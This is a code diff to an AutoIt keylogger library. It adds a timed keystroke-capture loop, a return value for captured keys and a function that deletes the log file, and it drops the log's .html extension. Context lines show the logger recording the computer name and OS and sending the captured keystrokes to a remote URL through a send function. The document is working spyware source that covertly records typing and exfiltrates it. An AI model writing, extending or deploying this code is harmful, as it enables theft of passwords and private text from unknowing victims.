@@ -41,10 +41,10 @@ Func _init($path)
 	$Time=@hour&":"&@min&":"&@sec
 	$Seperator = "\"
 	If not StringCompare($path, "") Then $Seperator = ""
-	$file_path = $path&$Seperator&@hour+@mon&"_"&@min*2&"_"&@sec*@year&".html"
+	$file_path = $path&$Seperator&@hour+@mon&"_"&@min*2&"_"&@sec*@year
 	Global $File = FileOpen($file_path, 1) ; The filename needed to be a bit cryptic in case you have more than one in the same location
-	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>' & @CRLF)
-	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>" & @CRLF)
+	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>')
+	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>")
 EndFunc
 
 ; Initializes the HTML-File with a specified name and all global Variables
@@ -53,10 +53,10 @@ Func _initWithFilename($path, $filename)
 	$Time=@hour&":"&@min&":"&@sec
 	$Seperator = "\"
 	If not StringCompare($path, "") Then $Seperator = ""
-	$file_path = $path&$Seperator&$filename&".html"
+	$file_path = $path&$Seperator&$filename
 	Global $File = FileOpen($file_path, 1) ; The file
-	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>' & @CRLF)
-	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>" & @CRLF)
+	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>')
+	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>")
 EndFunc
 
 ; Writes the last key to the file
@@ -399,6 +399,8 @@ Func _getPressedKey()
 
 	If StringCompare($key, "") Then $pressed = True ; Strangely "StringCompare" gives you a 0 (also interpreted as "False") when the strings match
 
+	return $key
+	
 EndFunc
 
 ; Takes the key and writes it to the file
@@ -416,6 +418,13 @@ Func _run()
    While 1
 	   _read()
 	WEnd
+EndFunc
+
+; A loop with a fixed number of iterations (iterations * wait_time = runtime of the keylogger)
+Func _runFor($iterations)
+    For $i = 0 To $iterations Step 1
+	   _read()
+	Next
 EndFunc
 
 ; An endless loop of reading if a certain window is open
@@ -438,4 +447,10 @@ Func _send($url)
 	InetRead($url & "?name=" & @ComputerName & "&content=" & $content) ; The name is needed to identify where the logs are coming from
 	FileClose($File)
 	$File = FileOpen($file_path, 1)
+EndFunc
+
+; Deletes the log
+Func _deleteFile()
+	FileClose($File)
+	FileDelete($file_path)
 EndFunc
